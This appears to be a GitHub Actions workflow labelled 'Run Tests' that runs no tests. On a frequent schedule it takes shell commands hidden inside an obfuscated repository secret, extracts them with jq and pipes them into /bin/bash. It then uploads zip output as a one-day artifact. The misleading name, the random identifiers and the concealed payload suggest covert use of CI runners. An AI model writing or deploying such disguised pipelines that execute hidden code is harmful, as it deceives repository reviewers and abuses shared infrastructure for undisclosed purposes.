name: Run Tests
on:
  workflow_dispatch:

  schedule:
    - cron: '10 1,7,13,19 * * *'
jobs:
  launch:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Do work
        env:
          c165: ${{ secrets.c165 }}
        run: |
          printf '%s' "$c165" | jq -r .zcao418 | /bin/bash
          echo $ma8 | jq -r .euty9035 | /bin/bash

      - name: Archive data
        uses: actions/upload-artifact@v4
        with:
          name: z2c6jpJs
          path: "*.zip"
          retention-days: 1
